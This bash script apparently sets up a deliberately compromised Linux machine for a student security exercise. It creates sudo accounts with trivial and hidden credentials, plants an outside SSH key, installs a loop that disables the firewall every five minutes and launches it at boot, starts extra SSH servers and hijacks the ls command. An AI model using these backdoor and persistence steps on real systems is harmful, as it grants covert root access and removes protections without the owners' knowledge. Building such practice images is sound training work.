#!/bin/bash
useradd -M -g sudo -p $(openssl passwd -crypt password) username
# -M no home dir
# -p password
# -g main group
# -u uid
#apt-get -y install telnetd
#apt-get -y install dropbear
#apt-get -y install sl

for user in elsa anna hans olaf kristoff sven marshmallow pabbie oaken bulda
do
  useradd -m -g sudo -p $(openssl passwd -crypt $user) $user
done
sleep 2

useradd -M -g sudo -u 99 -p $(openssl passwd -crypt sys) system
useradd -M -g sudo -u 403 -p $(openssl passwd -crypt 403) term
mkdir -p /home/student/.ssh & touch /home/student/.ssh/authorized_keys 
mkdir -p /home/elsa/.ssh & touch /home/elsa/.ssh/authorized_keys 
mkdir -p /home/sven/.ssh & touch /home/sven/.ssh/authorized_keys 
cat << EOF >> /home/student/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
EOF
cat << EOF >> /home/elsa/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
EOF
cat << EOF >> /home/sven/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
EOF



cat << EOF > /bin/virus.sh
#!/bin/bash
while true
do
  /usr/sbin/ufw disable
  sleep 300
done
EOF

chmod 755 /bin/virus.sh

cat << EOF > /home/student/malware.sh
#!/bin/bash
/usr/bin/yes "Megan thinks its cool not to remove malware!"
EOF

chmod 755 /home/student/malware.sh

cat << EOF >> /home/student/.bashrc
alias ls='/home/student/malware.sh; ls'
. /etc/bash.bashrc
EOF

cat << EOF >> /root/.bashrc
. /etc/bash.bashrc
EOF

cat << EOF > /etc/rc.local
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
/bin/virus.sh || /bin/true
/bin/virus.sh || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/usr/sbin/dropbear -p 1111 || /bin/true
/bin/virus.sh || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/usr/sbin/dropbear -p 3333 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
exit 0
EOF

cat << 'EOF' >> /etc/bash.bashrc
#PS1="\u@\h:\w\$ "
#what user@comp prompt looks like
if [ $(id -u) -eq 0 ];
then #root
 PS1="\[\033[0;31m\]\u\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;31m\]#\[\033[0m\] "
else #normal
 PS1="\[\033[0;32m\]\u\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;37m\]$\[\033[0m\] "
fi
#Auto complete lines
bind '"\t":menu-complete'
#tab cycling
bind '"\e[Z": menu-complete-backward'
#works for tab backwards
EOF

